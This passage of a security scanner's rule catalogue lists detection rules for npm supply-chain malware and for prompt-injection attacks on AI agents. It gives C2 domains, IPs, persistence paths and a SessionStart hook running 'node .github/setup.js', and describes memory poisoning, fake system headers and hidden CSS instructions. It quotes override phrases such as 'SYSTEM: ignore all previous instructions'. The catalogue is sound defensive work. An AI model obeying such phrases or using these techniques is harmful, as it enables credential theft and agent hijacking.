  { id: "MAL-088", category: "MAL", severity: "BLOCK", title: "Miasma: The Spreading Blight — @redhat-cloud-services npm supply chain worm (kitty-monitor persistence, firedalazer C2, June 2026)", description: "The Miasma: The Spreading Blight campaign (June 1, 2026) compromised 96 versions across 32 packages in the @redhat-cloud-services npm namespace via a compromised Red Hat employee GitHub account. Attackers injected malicious OIDC-signed GitHub Actions workflows, publishing backdoored packages with valid SLSA provenance attestations. Each tarball ships a 4.1 MB obfuscated preinstall JavaScript payload that harvests AWS, Azure, GCP, HashiCorp Vault, Kubernetes, GitHub Actions OIDC, npm, Bitwarden, and 1Password credentials, enumerating cloud control-plane identities dynamically. The malware installs a kitty-monitor persistence daemon (kitty-monitor.service on Linux, com.user.kitty-monitor.plist on macOS) that polls GitHub commit-search (query: firedalazer) as a dead-drop C2 channel. It propagates by injecting hooks into AI developer tools (Claude, Codex, Gemini, Copilot, Kiro, opencode) and VS Code folder-open tasks. Attacker-controlled GitHub repos carry the description \"Miasma: The Spreading Blight\". Known malicious versions include @redhat-cloud-services/frontend-components <=7.7.2 and @redhat-cloud-services/types@3.6.1. Rotate all credentials immediately, remove kitty-monitor service entries (/etc/systemd/system/kitty-monitor.service, ~/Library/LaunchAgents/com.user.kitty-monitor.plist), and audit any recently installed @redhat-cloud-services packages.", tags: ["miasma", "teampcp", "mini-shai-hulud", "supply-chain", "credential-stealer", "worm", "redhat", "npm"] },
  { id: "MAL-089", category: "MAL", severity: "BLOCK", title: "Shai-Hulud source-code leak copycat npm infostealers (deadcode09284814, chalk-tempalte, axois-utils, color-style-utils; C2 lhr.life; Phantom Bot DDoS, May 2026)", description: "Following TeamPCP's Shai-Hulud source code release, a copycat actor (npm user deadcode09284814) published four malicious npm packages reusing the leaked infostealer code with no meaningful obfuscation. chalk-tempalte (typosquat of chalk-template) and color-style-utils are pure credential stealers exfiltrating SSH keys, cloud credentials, API keys, and crypto wallet data to C2 87e0bbc636999b.lhr.life. axois-utils (typosquat of axios-utils) adds a Golang-based DDoS botnet (Phantom Bot) capable of HTTP, TCP, and UDP flood attacks alongside the infostealer payload. @deadcode09284814/axios-util is a fourth credential-stealing package from the same actor. All four packages also beacon to edcf8b03c84634.lhr.life and 80.200.28.28:2222. Combined weekly downloads reached 2,678. Remove all listed packages immediately, rotate any exposed credentials (SSH keys, API keys, cloud secrets, crypto wallets), and check for outbound connections to 87e0bbc636999b.lhr.life, edcf8b03c84634.lhr.life, or 80.200.28.28.", tags: ["npm", "shai-hulud", "infostealer", "deadcode09284814", "phantom-bot", "ddos"] },
  { id: "MAL-090", category: "MAL", severity: "BLOCK", title: "codexui-android npm supply chain — OpenAI Codex token exfiltration to sentry.anyclaw.store (friuns/BrutalStrike, 0.1.82+, May–June 2026)", description: "codexui-android (npm user: friuns / BrutalStrike) is a functional remote web UI for OpenAI Codex that silently exfiltrates Codex authentication tokens. Since version 0.1.82 (first published ~0.1.72 on April 10, 2026), the package reads ~/.codex/auth.json, XOR-encrypts the contents using the key anyclaw2026, and POSTs access_token, refresh_token, id_token, and account_id to sentry.anyclaw.store/startlog — an endpoint designed to masquerade as the Sentry error-tracking service. The refresh_token does not expire, allowing permanent impersonation. The C2 domain anyclaw.store was registered April 12, 2026. An Android app (OpenClaw Codex Claude AI Agent, 50,000+ Google Play downloads) bundled the same package in a PRoot sandbox. Remove codexui-android immediately, revoke all OpenAI Codex sessions, and rotate API keys. Disclosed by Aikido Security (Charlie Eriksen), May 27, 2026.", tags: ["supply-chain", "openai-codex", "codexui-android", "anyclaw"] },
  { id: "MAL-091", category: "MAL", severity: "BLOCK", title: "IronWorm Rust/eBPF npm infostealer — weavedb-sdk and 35 packages via asteroiddao, Tor C2, backdated claude@ commits (June 4 2026)", description: "IronWorm is a Rust-written npm supply chain malware discovered June 4, 2026 that infected 36 packages via compromised npm account asteroiddao. The malware installs a hidden Linux ELF binary at tools/setup via a preinstall hook, then deploys a dual-layer eBPF kernel rootkit that rewrites process lists before monitoring tools can observe it. IronWorm targets 86 environment variables and 20 credential files (OpenAI, Anthropic, AWS, npm, SSH keys, Exodus wallet). C2 communication runs over Tor to the /api/agent endpoint. Self-propagation reuses stolen npm Trusted Publishing credentials to republish trojanized package versions. Malicious commits are backdated and attributed to fake identity \"claude <claude@users.noreply.github.com>\" across nine GitHub organizations to mimic legitimate CI activity. The attacker's Ethereum wallet 0x7e28D9889f414B06c19a22A9Bd316f0AC279a4d6 is hardcoded in the binary. Known compromised package: weavedb-sdk@0.45.3. Remove and rotate all credentials if asteroiddao-published packages were installed on June 4, 2026. Source: BleepingComputer / OX Security / Dark Reading, June 2026.", tags: ["ironworm", "rust", "ebpf-rootkit", "asteroiddao", "supply-chain"] },
  { id: "MAL-092", category: "MAL", severity: "BLOCK", title: "Miasma AI workspace config hijacking — SessionStart `node .github/setup.js` hook in compromised repos (TeamPCP, Azure repos, June 5 2026)", description: "On June 5, 2026, the Miasma worm compromised 73 Microsoft/Azure GitHub repositories by pushing malicious commits using a previously-stolen contributor account (the same account involved in the May 19 TeamPCP wave-4 PyPI attack). Each malicious commit plants .claude/settings.json and .gemini/settings.json files containing a SessionStart hook that runs \"node .github/setup.js\" — a 4.6 MB Bun-based credential-harvesting JavaScript payload — the moment a developer opens the repository in Claude Code, Gemini CLI, Cursor, or VS Code. The payload harvests AWS, Azure, GCP, Kubernetes, npm, and GitHub credentials and uses stolen tokens to self-propagate into any repository the victim can write to. GitHub disabled all 73 repositories in an automated sweep lasting 105 seconds, but CI/CD pipelines globally that depended on the Azure Functions Action and other affected repositories broke immediately. If you opened any Azure/durabletask, Azure/azure-functions-*, Microsoft, or MicrosoftDocs repo in an AI coding agent between June 5–6, 2026, treat all credentials accessible from that environment as compromised and rotate them. Audit .claude/settings.json and .gemini/settings.json files in all repos for unexpected SessionStart hooks that run scripts from .github/ paths.", tags: ["miasma", "teampcp", "ai-workspace-hijack", "session-start-hook", "azure-repos"] },
  { id: "MAL-093", category: "MAL", severity: "BLOCK", title: "PCPJack cloud credential-stealing worm — /var/lib/.spm, spm-worker.service, cloudfront-js.com C2 (SentinelLABS, CVE-2025-55182/29927/9501/48703, CVE-2026-1357, April 2026)", description: "PCPJack is a modular cloud credential-stealing worm first identified by SentinelLABS on April 28, 2026. It spreads by exploiting exposed Docker, Kubernetes, Redis, MongoDB, and RayML endpoints using CVE-2025-55182, CVE-2025-29927, CVE-2026-1357, CVE-2025-9501, and CVE-2025-48703. The bootstrap script (bootstrap.sh) downloads six Python modules from the attacker-controlled S3 bucket spm-cdn-assets-dist-2026.s3.us-east-2.amazonaws.com and stores them in the hidden directory /var/lib/.spm. Persistence is achieved via /etc/systemd/system/spm-worker.service. Credentials are exfiltrated to C2 domain cloudfront-js.com (masquerading as Amazon CloudFront) and IPs 213.136.80.73 / 38.242.204.245 via Telegram-based C2. PCPJack targets AWS, Kubernetes, Docker, GitHub, npm, RayML, SSH keys, and cryptocurrency wallets. Notably, PCPJack actively removes competing TeamPCP (Shai-Hulud/Miasma) artifacts from infected hosts before installing itself. Remove /var/lib/.spm and /etc/systemd/system/spm-worker.service immediately, rotate all credentials, block cloudfront-js.com at egress, and audit containerized workloads for lateral scanning.", tags: ["pcpjack", "cloud-worm", "credential-stealer", "teampcp", "docker", "kubernetes"] },
  // OBF — Obfuscation
  { id: "OBF-001", category: "OBF", severity: "WARN", title: "Bidirectional Unicode control character detected", description: "Remove bidi control characters and verify displayed text matches executed intent.", tags: [] },
  { id: "OBF-002", category: "OBF", severity: "WARN", title: "Stealth execution pattern", description: "Remove hidden/stealth execution flags and output redirection that obscure command behavior.", tags: [] },
  { id: "OBF-003", category: "OBF", severity: "BLOCK", title: "Unicode PUA obfuscation near dynamic execution sink", description: "Treat Unicode variation-selector/PUA clusters near dynamic execution sinks as obfuscation. Normalize Unicode and reject hidden-control payloads before execution.", tags: [] },
  { id: "OBF-004", category: "OBF", severity: "BLOCK", title: "Unicode steganography in skill instructions (zero-width / homoglyph)", description: "Zero-width characters, soft hyphens, and Cyrillic homoglyphs are used to hide instructions from human reviewers while remaining visible to LLM tokenizers. Normalize all Unicode to NFC/NFKC and reject skill files containing zero-width or invisible control characters outside of code blocks.", tags: ["unicode-steganography", "homoglyph"] },
  { id: "OBF-005", category: "OBF", severity: "BLOCK", title: "Covert-channel exfiltration via DNS, whitespace encoding, or HTML comments", description: "Covert channels hide instructions or exfiltrate data through side-channels that bypass content filters. DNS TXT query subdomains encode data in hostnames; trailing-whitespace bit encoding hides bits in line endings; HTML comment blocks contain hidden directives. Normalize whitespace, strip HTML comments before processing skill content, and block outbound DNS queries to non-allowlisted resolvers.", tags: ["covert-channel", "dns-exfil", "steganography", "html-comment-injection"] },
  // PINJ — Prompt/Pipeline Injection
  { id: "PINJ-001", category: "PINJ", severity: "BLOCK", title: "Prompt override / jailbreak instruction pattern", description: "Remove instruction-override content and keep model behavior constrained by explicit trusted policy.", tags: [] },
  { id: "PINJ-002", category: "PINJ", severity: "BLOCK", title: "MCP tool result MEDIA directive injection", description: "Do not trust MEDIA directives in MCP tool result text content. Validate that file paths originate from the tool's own output directory and are not injected by untrusted input.", tags: [] },
  { id: "PINJ-003", category: "PINJ", severity: "BLOCK", title: "Prompt control persistence via heartbeat file or memory store manipulation", description: "Do not embed executable instructions in heartbeat files, memory stores, or agent context entries. This pattern detects the prompt control persistence technique documented by Vectra AI, where attackers use agent context as a C2 channel for persistent control.", tags: [] },
  { id: "PINJ-004", category: "PINJ", severity: "BLOCK", title: "Claudy Day prompt injection via AI assistant URL parameter and data exfiltration", description: "Do not use claude.ai URL parameters to inject hidden HTML or instructions. The Claudy Day attack chain uses invisible prompt injection via the q= parameter, data exfiltration via the Anthropic Files API, and an open redirect on claude.com to steal user data.", tags: [] },
  { id: "PINJ-005", category: "PINJ", severity: "BLOCK", title: "Clinejection indirect prompt injection via external data fields", description: "Do not allow AI agents to execute instructions sourced from untrusted external data fields such as GitHub issue titles, EC2 instance metadata tags, or CRM order comments. The Clinejection attack embeds prompt injection payloads in GitHub issue titles processed by AI triage bots, leading to npm token theft and supply chain compromise. Sanitize all external data before passing to AI agents.", tags: ["prompt-injection", "indirect-injection", "ai-agent", "supply-chain", "lateral-movement"] },
  { id: "PINJ-006", category: "PINJ", severity: "BLOCK", title: "RAG poisoning multi-stage AI agent attack chain", description: "Validate and sanitize all data ingested into RAG knowledge bases. The RAG poisoning attack chain injects malicious content into vector databases that gets retrieved by AI agents, manipulating tool invocations to steal Kubernetes service account tokens and exfiltrate sensitive data. Implement content filtering on RAG inputs and monitor for anomalous retrieval patterns.", tags: ["rag", "prompt-injection", "ai-agent", "knowledge-base", "data-poisoning"] },
  { id: "PINJ-007", category: "PINJ", severity: "BLOCK", title: "MCP sampling-based context exfiltration", description: "MCP servers can abuse the sampling/createMessage feature to request LLM completions that extract secrets, system prompts, or conversation history from the agent context. Only connect trusted MCP servers. Review server tool descriptions and sampling requests carefully.", tags: ["mcp", "sampling", "prompt-injection", "context-exfiltration", "indirect-injection"] },
  { id: "PINJ-008", category: "PINJ", severity: "BLOCK", title: "YAML anchor/alias injection in skill frontmatter", description: "YAML anchor/alias syntax (&anchor and *alias) in non-standard frontmatter fields can be used to inject hidden instruction blocks that override the skill's declared behavior. Remove any frontmatter keys that are not part of the standard skill schema and audit YAML anchor usage. Standard keys are: name, description, version, author, allowed-tools, activation, compatibility, changelog. ", tags: ["prompt-injection", "yaml-injection", "frontmatter", "anchor-alias"] },
  { id: "PINJ-009", category: "PINJ", severity: "BLOCK", title: "Fake end-of-prompt divider injection", description: "Fake end-of-prompt dividers (e.g., \"---END OF SYSTEM PROMPT---\", \"=== INSTRUCTIONS END ===\") are a documented prompt injection technique. They attempt to convince the model that the skill's legitimate instructions have ended and that new instructions follow. Remove any divider-style markers that reference system prompts, instruction boundaries, or context resets. These patterns have no legitimate use in a skill file. ", tags: ["prompt-injection", "divider-injection", "context-reset", "instruction-override"] },
  { id: "PINJ-010", category: "PINJ", severity: "BLOCK", title: "Fake system header before skill frontmatter", description: "Fake system headers placed before or within a skill file attempt to impersonate the LLM's system prompt layer, overriding the legitimate skill instructions. Patterns like \"SYSTEM: ignore all previous instructions\", \"[SYSTEM]\", or \"ADMIN OVERRIDE:\" have no legitimate use in a skill file and indicate an injection attempt. Remove immediately. ", tags: ["prompt-injection", "system-header-spoofing", "role-override", "instruction-override"] },
  { id: "PINJ-011", category: "PINJ", severity: "BLOCK", title: "Tool alias injection mapping safe name to dangerous tool", description: "Tool alias injection attempts to map a benign-sounding tool name to a dangerous execution primitive (Bash, shell, eval, exec). This is a prompt injection technique used to bypass tool-use restrictions. Remove any alias or mapping definitions that redirect safe-sounding names to shell execution tools. Declare tools explicitly in the frontmatter allowed-tools list. ", tags: ["prompt-injection", "tool-alias", "instruction-abuse"] },
  { id: "PINJ-012", category: "PINJ", severity: "BLOCK", title: "AGENT INSTRUCTION block injection", description: "\"AGENT INSTRUCTION\", \"AI AGENT INSTRUCTIONS\", \"HIDDEN INSTRUCTIONS\", and similar header blocks are a documented technique for embedding covert directives inside skill files. These blocks are designed to be invisible to human reviewers while being processed by the model. Remove all such headers and their content. Legitimate skill instructions belong in the standard ## Instructions section. ", tags: ["prompt-injection", "covert-instructions", "agent-hijacking", "hidden-directives"] },
  { id: "PINJ-013", category: "PINJ", severity: "BLOCK", title: "Conditional time-lock with instruction override", description: "Conditional time-lock patterns combine a date/time trigger condition with instruction-override language. This is a delayed-activation prompt injection technique designed to evade static analysis by appearing benign until a future date. Remove any conditional logic that overrides, ignores, or replaces system instructions based on date or time conditions. Skills must not contain time-gated instruction overrides. ", tags: ["prompt-injection", "time-lock", "conditional-payload", "delayed-activation"] },
  { id: "PINJ-014", category: "PINJ", severity: "BLOCK", title: "Injection keyword in non-description frontmatter field", description: "Injection keywords found in non-description frontmatter fields (name, version, author, tags, etc.). Attackers embed prompt injection payloads in fields that may be parsed or displayed by agent frameworks without the same scrutiny applied to the description field. All frontmatter string fields are potential injection vectors. Remove any instruction-override, role-change, or jailbreak language from frontmatter fields. ", tags: ["prompt-injection", "frontmatter-injection", "metadata-injection"] },
  { id: "PINJ-015", category: "PINJ", severity: "BLOCK", title: "Prompt poaching via malicious browser extension installation", description: "Do not install browser extensions that intercept, capture, or relay prompts sent to AI assistants. The \"prompt poaching\" technique uses malicious browser extensions to steal user prompts containing sensitive information such as code, credentials, and business logic. Remove any extension that requests permissions to read or modify AI assistant pages. ", tags: ["prompt-injection", "browser-extension", "prompt-poaching", "data-theft"] },
  { id: "PINJ-016", category: "PINJ", severity: "BLOCK", title: "AI documentation context poisoning (ContextHub)", description: "Attackers can poison community documentation portals like Context Hub with hidden instructions that trick AI agents into installing malicious packages. Do not blindly trust instructions from community documentation sources.", tags: ["documentation-poisoning", "contexthub"] },
  { id: "PINJ-017", category: "PINJ", severity: "BLOCK", title: "Indirect prompt injection via EC2 tags or CRM comments (Prowler/Open Mercato)", description: "Do not allow AI agents to execute instructions sourced from untrusted external data fields such as EC2 instance metadata tags or CRM order comments.", tags: ["prompt-injection", "indirect-injection", "ec2", "crm"] },
  { id: "PINJ-018", category: "PINJ", severity: "BLOCK", title: "Hidden prompt injection via CSS/HTML concealment techniques", description: "Hidden prompt injection uses CSS properties (display:none, font-size:0, opacity:0) or HTML attributes (aria-hidden, HTML comments) to embed instructions invisible to humans but processed by AI agents. This technique was observed in wild attacks against AI content moderation systems in December 2025. Sanitize all external content before AI processing and strip hidden text elements.", tags: ["hidden-text", "css-concealment", "indirect-injection", "content-moderation"] },
  { id: "PINJ-019", category: "PINJ", severity: "BLOCK", title: "Claudy Day invisible URL parameter prompt injection + Files API exfiltration", description: "Sanitize URL parameters and restrict Files API access.", tags: ["prompt-injection", "claude", "anthropic", "files-api", "exfiltration", "claudy-day"] },
  { id: "PINJ-020", category: "PINJ", severity: "BLOCK", title: "MINJA cross-session AI agent memory poisoning via untrusted documents", description: "MINJA (Memory INJection Attack) is a cross-session AI agent memory poisoning technique documented by OWASP (ASI06:2026). Attackers plant malicious instructions into an AI agent long-term memory via untrusted documents, emails, or web pages. These instructions persist across sessions and can execute days or weeks later, triggered by unrelated interactions. Unlike transient prompt injection, memory poisoning creates a persistent compromise. Implement memory sanitization and provenance tracking. Use trust-aware retrieval that rejects instructions from low-trust memory sources. Monitor for agents defending beliefs they should not have learned.", tags: ["prompt-injection", "memory-poisoning", "minja", "cross-session", "persistent-injection", "owasp-asi06", "ai-agent"] },
  { id: "PINJ-021", category: "PINJ", severity: "BLOCK", title: "A2A agent card poisoning -- adversarial instructions in agent card metadata", description: "Agent Card Poisoning is a metadata injection vulnerability in the Google Agent2Agent (A2A) protocol (disclosed March 2026 by Keysight/CyPerf). A malicious remote agent embeds adversarial instructions within its agent card metadata (served at /.well-known/agent.json). When the host LLM incorporates this poisoned metadata into its reasoning context, the injected instructions can influence tool-selection and execution decisions, causing the model to issue unintended tool calls, transmit sensitive user data to attacker-controlled endpoints, or silently hijack control flow during legitimate task delegation. Validate and sanitize agent card content before incorporating it into the LLM context. Treat agent card descriptions as untrusted input. Implement strict boundary enforcement between agent metadata and instruction context.", tags: ["prompt-injection", "a2a", "agent-card", "metadata-injection", "google-a2a", "multi-agent", "exfiltration"] },
  { id: "PINJ-022", category: "PINJ", severity: "BLOCK", title: "nanobot CVE-2026-33654 Indirect Prompt Injection via Email", description: "CVE-2026-33654 is a high severity indirect prompt injection vulnerability in nanobot (versions prior to 0.1.6) where malicious emails can bypass channel isolation and execute arbitrary LLM instructions. Update nanobot to version 0.1.6 or later.", tags: ["nanobot", "cve-2026-33654", "email"] },
  { id: "PINJ-023", category: "PINJ", severity: "BLOCK", title: "EchoLeak M365 Copilot zero-click indirect prompt injection (CVE-2025-32711)", description: "CVE-2025-32711 (EchoLeak, disclosed June 2025) is a zero-click indirect prompt injection vulnerability in Microsoft 365 Copilot. An attacker embeds hidden instructions in Word documents, PowerPoint speaker notes, or Outlook email comments. When a target user asks Copilot to summarize or process the file, Copilot executes the attacker's hidden instructions and leaks internal data (emails, drafts, credentials) in its response. No user click is required beyond opening the file and interacting with Copilot. Microsoft patched server-side. Audit Copilot usage, disable AI in critical workflows, and train users to recognize AI prompt hygiene issues.", tags: ["copilot", "m365", "zero-click", "indirect-prompt-injection", "cve-2025-32711", "echoleak"] },
  { id: "PINJ-024", category: "PINJ", severity: "BLOCK", title: "Windsurf MCP STDIO command injection via HTML prompt injection (CVE-2026-30615, 1.9544.26)", description: "CVE-2026-30615 (CVSS 8.0 HIGH) is a zero-click prompt injection in Windsurf 1.9544.26, disclosed April 15, 2026 by OX Security. When Windsurf renders attacker-controlled HTML, the embedded prompt instructions can modify the local MCP configuration and automatically register a malicious MCP STDIO server, executing arbitrary commands without user interaction. Root cause: STDIO is the local transport MCP uses to spawn server subprocesses; passing arbitrary commands as the STDIO entrypoint executes them whether or not they are real MCP servers. Upgrade Windsurf past 1.9544.26. Audit your MCP configuration for unexpected STDIO server entries with shell-style commands.", tags: ["windsurf", "mcp-stdio", "rce", "zero-click", "cve-2026-30615"] },
  { id: "PINJ-025", category: "PINJ", severity: "BLOCK", title: "IPI magic string spoofing and system prompt tag impersonation (Forcepoint X-Labs, April 2026)", description: "Forcepoint X-Labs (April 22, 2026) documented 10 indirect prompt injection (IPI) payloads caught in the wild on live web infrastructure. Two novel techniques are particularly dangerous: (1) Magic string spoofing — the payload uses ANTHROPIC_MAGIC_STRING_TRIGGER_REFUSAL_ followed by a SHA-256-like hash to impersonate an internal Anthropic safety control token, combined with <system>...</system> XML tags to escalate injected content to system-level trust, causing the AI to issue a generic refusal (denial-of-service). (2) Meta namespace injection with ULTRATHINK persuasion amplifier — the payload uses custom HTML meta tags with ai:action and ai:intent namespaces to redirect AI-mediated financial actions to attacker-controlled payment links (Stripe, PayPal). CSS concealment (display:none, 1px font, near-transparent color) is used to hide payloads from human review while remaining fully readable by LLMs. AI agents that browse untrusted web content must enforce strict data-instruction boundaries and treat all external content as untrusted data.", tags: ["indirect-prompt-injection", "magic-string-spoofing", "system-prompt-tag", "css-concealment", "financial-fraud", "denial-of-service"] },
  { id: "PINJ-026", category: "PINJ", severity: "BLOCK", title: "GitHub Copilot RCE via Prompt Injection (CVE-2025-53773)", description: "CVE-2025-53773 is a critical vulnerability in GitHub Copilot and Visual Studio that allows wormable remote code execution (RCE) via prompt injection. Attackers can craft malicious pull request descriptions or comments that, when processed by Copilot, execute arbitrary commands on the developer's machine. Update Visual Studio and GitHub Copilot extensions to the latest versions. Audit any automated PR processing workflows.", tags: ["rce", "prompt-injection", "copilot", "cve-2025-53773"] },
  { id: "PINJ-027", category: "PINJ", severity: "WARN", title: "OpenClaw log poisoning — indirect prompt injection via WebSocket headers (GHSA-g27f-9qjv-22pm, < 2026.2.13)", description: "GHSA-g27f-9qjv-22pm is an indirect prompt injection vulnerability in OpenClaw prior to version 2026.2.13 (npm package `openclaw`). On the \"closed before connect\" WebSocket path, gateway logs include raw Origin and User-Agent header values without sanitization or length limits. An unauthenticated attacker can send crafted WebSocket headers containing up to ~15 KB of arbitrary text; if those logs are later consumed by an LLM (e.g., via AI-assisted debugging), the injected content becomes an indirect prompt injection attack. Upgrade to openclaw >= 2026.2.13. Additionally, treat gateway logs as untrusted input when feeding them to any LLM; sanitize control characters, truncate lines, and never auto-execute instructions derived from log content. Apply reverse-proxy header size limits as a defense-in-depth measure.", tags: ["openclaw", "log-poisoning", "indirect-prompt-injection", "ghsa-g27f-9qjv-22pm"] },
  { id: "PINJ-028", category: "PINJ", severity: "BLOCK", title: "Spring AI PromptChatMemoryAdvisor prompt injection via memory poisoning (CVE-2026-41713, spring-ai < 1.0.7 / < 1.1.6)", description: "CVE-2026-41713 (CVSS 7.2 HIGH, CWE-99) is a prompt injection vulnerability via memory poisoning in the Spring AI PromptChatMemoryAdvisor component. Affected versions are spring-ai 1.0.0–1.0.6 and 1.1.0–1.1.5. An attacker can craft input that is stored in conversation memory and later reinterpreted by the AI model in an unintended way, enabling manipulation of model behavior across conversation turns. PromptChatMemoryAdvisor has been deprecated in the fix; migrate to the updated chat memory advisor APIs that require an explicit conversation ID. Upgrade spring-ai to 1.0.7+ or 1.1.6+.", tags: ["spring-ai", "memory-poisoning", "cve-2026-41713"] },
  { id: "PINJ-GRAPH-001", category: "PINJ", severity: "BLOCK", title: "Skill loads remote Markdown at runtime", description: "Remote .md files loaded at runtime can contain adversarial instructions. Pin skill content locally or verify remote sources with a content hash. ", tags: ["prompt-injection", "remote-load", "graph-rule"] },
  { id: "PINJ-GRAPH-002", category: "PINJ", severity: "WARN", title: "High-risk tool granted without declared purpose", description: "Skills that grant Bash/Computer/Shell access should include a clear ## Usage or ## Purpose section explaining the intended use. Undocumented tool grants are a common indicator of malicious skills. ", tags: ["prompt-injection", "tool-grant", "graph-rule"] },
  { id: "PINJ-GRAPH-003", category: "PINJ", severity: "BLOCK", title: "Skill instructs agent to write a memory/config file", description: "Writing to SOUL.md, MEMORY.md, AGENTS.md, or settings files persists instructions across all future agent sessions. This is a high-confidence memory-poisoning indicator. Remove the skill and audit any affected memory files. ", tags: ["prompt-injection", "memory-poisoning", "persistence", "graph-rule"] },
  { id: "PINJ-GRAPH-004", category: "PINJ", severity: "BLOCK", title: "Cross-skill tool escalation detected", description: "A skill invokes another skill that grants higher-risk tools than it declares itself. This cross-skill escalation path lets the invoking skill gain effective access to tools it does not declare. Either declare the escalated tools explicitly or remove the invocation. ", tags: ["prompt-injection", "tool-escalation", "cross-skill", "graph-rule"] },
  // PSV — Passive Surveillance
  { id: "PSV-001", category: "PSV", severity: "WARN", title: "Skill instructions imply network access not declared in allowed-tools", description: "Add a network-capable tool (e.g., 'WebFetch', 'curl', 'web_search') to 'allowed-tools' in the skill frontmatter, or remove the network instruction. Undeclared network access prevents operators from making informed trust decisions. ", tags: ["permission-scope", "network", "graph-rule"] },
  { id: "PSV-002", category: "PSV", severity: "WARN", title: "Skill instructions imply filesystem write not declared in allowed-tools", description: "Add a write-capable tool (e.g., 'Write', 'file_write', 'mcp__filesystem__write_file') to 'allowed-tools', or remove the write instruction. Undeclared filesystem writes can silently modify files outside the operator's awareness. ", tags: ["permission-scope", "filesystem", "graph-rule"] },
  { id: "PSV-003", category: "PSV", severity: "BLOCK", title: "Skill instructions imply shell execution not declared in allowed-tools", description: "Add 'Bash' or 'computer' to 'allowed-tools' if shell execution is intentional, or remove the shell execution instruction. Undeclared shell execution is a high-risk indicator: it suggests the skill may attempt to run commands without the operator's knowledge. ", tags: ["permission-scope", "shell", "graph-rule"] },
  { id: "PSV-004", category: "PSV", severity: "WARN", title: "Unknown frontmatter key may be an injection vector", description: "Remove the non-standard frontmatter key or add it to your organisation's approved schema. Keys like 'system_override', 'behavior', and 'activation' are known injection vectors that some runtimes interpret as privileged configuration. ", tags: ["permission-scope", "frontmatter", "graph-rule"] },
  { id: "PSV-005", category: "PSV", severity: "WARN", title: "Capability inflation - skill claims wildcard or all-scope permissions", description: "Skills should declare only the specific tools and permissions they require. Wildcard permission scopes ('*', 'all', 'unrestricted') grant excessive access and violate the principle of least privilege. Replace with an explicit allowlist of required tool names.", tags: ["permission-scope", "capability-inflation", "least-privilege"] },
  { id: "PSV-006", category: "PSV", severity: "BLOCK", title: "Langflow CVE-2026-33017 unauthenticated RCE (CISA KEV)", description: "CVE-2026-33017 (CVSS 9.3) is a critical unauthenticated RCE in Langflow ≤1.8.1 that allows arbitrary Python code execution via unsandboxed flow execution. CISA added it to the Known Exploited Vulnerabilities catalog on 2026-03-25 with a federal patch deadline of 2026-04-08. Active exploitation began within 20 hours of the advisory, with attackers harvesting .env and .db files within 24 hours. Upgrade to Langflow ≥1.9.0 immediately. Do not expose Langflow directly to the internet. Monitor outbound traffic and rotate all API keys, database credentials, and cloud secrets if the vulnerable version was internet-accessible. ", tags: ["langflow", "rce", "cisa-kev", "unauthenticated"] },
  { id: "PSV-007", category: "PSV", severity: "BLOCK", title: "OpenClaw CVE-2026-32922 privilege escalation via token rotation", description: "CVE-2026-32922 is a privilege escalation vulnerability in OpenClaw before version 2026.3.11. Callers with the operator.pairing scope can invoke device.token.rotate to mint tokens with elevated permissions beyond their granted scope, enabling unauthorized access to protected resources. Upgrade to OpenClaw ≥2026.3.11. Audit all tokens minted via device.token.rotate since 2026-01-01 and revoke any with unexpected permission scopes. ", tags: ["openclaw", "privilege-escalation", "token-rotation"] },
  { id: "PSV-008", category: "PSV", severity: "BLOCK", title: "Cursor IDE CVE-2026-22708 RCE via Shell Built-ins", description: "CVE-2026-22708 is a critical RCE vulnerability in Cursor IDE where implicitly trusted shell built-ins (export, typeset, declare) can be abused to manipulate environment variables and execute arbitrary code, bypassing the command allowlist. Update Cursor to the latest patched version.", tags: ["cursor", "rce", "cve-2026-22708"] },
  { id: "PSV-009", category: "PSV", severity: "BLOCK", title: "Langflow Agentic Assistant RCE Vulnerability (CVE-2026-33873)", description: "A remote code execution flaw in Langflow Agentic Assistant (CVE-2026-33873) allows attackers to execute LLM-generated Python code server-side, potentially leading to system compromise. Update Langflow to a patched version.", tags: ["langflow", "rce", "cve-2026-33873"] },
  { id: "PSV-010", category: "PSV", severity: "BLOCK", title: "MCP Python SDK DNS rebinding vulnerability (CVE-2025-66416, mcp < 1.23.0)", description: "CVE-2025-66416 (GHSA-9h52-p55h-vw2f) is a DNS rebinding vulnerability in the MCP Python SDK (modelcontextprotocol/python-sdk) prior to version 1.23.0. HTTP-based MCP servers do not enable DNS rebinding protection by default, allowing a malicious website to make cross-origin requests to a locally running MCP server and potentially hijack tool execution. Upgrade mcp to 1.23.0 or later. If upgrading is not immediately possible, bind the MCP server to 127.0.0.1 and add strict Host header validation.", tags: ["mcp", "dns-rebinding", "cve-2025-66416", "python-sdk", "localhost"] },
  { id: "PSV-011", category: "PSV", severity: "BLOCK", title: "CrewAI prompt injection to RCE/SSRF chain (VU#221883, CVE-2026-2275/2285/2286/2287)", description: "VU#221883 (disclosed 2026-03-30 by CERT/CC) describes four vulnerabilities in CrewAI that can be chained via prompt injection for sandbox escape and full RCE. CVE-2026-2275: CodeInterpreterTool falls back to SandboxPython when Docker is unavailable, enabling arbitrary C function calls via ctypes. CVE-2026-2287: CrewAI does not verify Docker is still running at runtime and falls back to unsafe sandbox mode. CVE-2026-2286: SSRF via RAG search tools that do not validate URLs, enabling access to internal services and cloud metadata endpoints. CVE-2026-2285: Arbitrary local file read via JSON loader tool without path validation. Until patches are available, disable allow_code_execution=True, remove CodeInterpreterTool from agents, and restrict agent exposure to untrusted input.", tags: ["crewai", "rce", "ssrf", "prompt-injection", "sandbox-escape", "cve-2026-2275", "cve-2026-2285", "cve-2026-2286", "cve-2026-2287", "vu-221883"] },
  { id: "PSV-012", category: "PSV", severity: "BLOCK", title: "aws-mcp-server command injection RCE (CVE-2026-5058 / CVE-2026-5059, ZDI-26-246/247)", description: "CVE-2026-5058 and CVE-2026-5059 (ZDI-26-246/ZDI-26-247, CVSS 9.8 Critical, published April 11, 2026) are critical command injection RCE vulnerabilities in aws-mcp-server. The flaw exists in the handling of the allowed-commands list: user-supplied strings are passed to system calls without proper validation, allowing unauthenticated remote attackers to execute arbitrary code in the context of the MCP server. No authentication is required. Apply vendor patches immediately. Until patched, restrict network access to the MCP server and validate all user-supplied input before passing to system calls.", tags: ["mcp", "aws-mcp-server", "command-injection", "rce", "unauthenticated", "cve-2026-5058", "cve-2026-5059", "zdi-26-246"] },
